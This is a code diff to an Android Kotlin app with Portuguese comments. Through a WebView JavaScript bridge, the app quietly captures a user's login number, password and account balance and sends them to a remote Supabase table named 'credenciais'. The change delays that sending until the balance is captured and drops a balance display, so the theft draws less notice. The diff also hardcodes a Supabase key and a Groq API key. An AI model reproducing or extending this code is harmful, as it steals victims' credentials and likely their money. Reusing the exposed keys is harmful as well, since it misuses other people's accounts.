@@ -426,7 +426,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.2"
+    private val VERSAO_ATUAL = "5.3"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -760,8 +760,9 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun loginClicado() {
+                // Reset para nova sessão — só envia quando o saldo chegar
                 credenciaisEnviadas = false
-                handler.postDelayed({ tentarEnviarCredenciais() }, 800)
+                saldoEmMemoria = ""
             }
 
             @JavascriptInterface
@@ -769,18 +770,9 @@ class MainActivity : AppCompatActivity() {
                 val limpo = valor.trim()
                 if (limpo.isEmpty()) return
                 saldoEmMemoria = limpo
-                // Se já temos número e senha mas ainda não enviámos → enviar agora
+                // Enviar só quando temos número + senha + saldo — e só uma vez por sessão
                 if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
-                    enviarCredenciaisCompletas()
-                }
-                // Mostrar saldo na barra
-                runOnUiThread {
-                    if (::txtMinutos.isInitialized) {
-                        // Mostrar saldo discretamente na linha do relógio quando não há voo
-                        if (!emVoo) {
-                            // saldo visível no txtRelogio se existir, senão txtMinutos
-                        }
-                    }
+                    runOnUiThread { enviarCredenciaisCompletas() }
                 }
             }
         }, "Android")
